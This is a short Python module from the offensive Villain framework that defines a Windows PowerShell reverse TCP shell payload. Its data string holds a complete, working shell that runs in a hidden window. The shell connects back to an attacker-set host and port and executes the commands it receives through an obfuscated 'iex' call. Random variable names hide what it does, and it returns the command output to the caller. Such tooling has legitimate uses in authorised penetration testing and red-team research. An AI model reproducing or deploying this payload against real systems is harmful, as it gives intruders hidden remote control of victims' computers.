# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic PowerShell Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'powershell-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {
        'encode' : True
    }
   
    data = "Start-Process $PSHOME\powershell.exe -ArgumentList {$8760b98e984a48d293a47c05245a640f = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$8d3b8179bcf343149c7f04476bd1e701 = $8760b98e984a48d293a47c05245a640f.GetStream();[byte[]]$86ce3a33d33642bbbf2a16a7b175e7e2 = 0..65535|%{0};while(($i = $8d3b8179bcf343149c7f04476bd1e701.Read($86ce3a33d33642bbbf2a16a7b175e7e2, 0, $86ce3a33d33642bbbf2a16a7b175e7e2.Length)) -ne 0){;$48fd3c52e8924aefbf56b277f16fc6fc = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($86ce3a33d33642bbbf2a16a7b175e7e2,0, $i);$f136ee90168144f38916d49b801466fa = (i""e''x $48fd3c52e8924aefbf56b277f16fc6fc 2>&1 | Out-String );$f136ee90168144f38916d49b801466fa2 = $f136ee90168144f38916d49b801466fa + 'PS ' + $(gl).Path + '> ';$4658346d8920458e9efda3aae4d013c8 = ([text.encoding]::ASCII).GetBytes($f136ee90168144f38916d49b801466fa2);$8d3b8179bcf343149c7f04476bd1e701.Write($4658346d8920458e9efda3aae4d013c8,0,$4658346d8920458e9efda3aae4d013c8.Length);$8d3b8179bcf343149c7f04476bd1e701.Flush()};$8760b98e984a48d293a47c05245a640f.Close()} -WindowStyle Hidden"
    
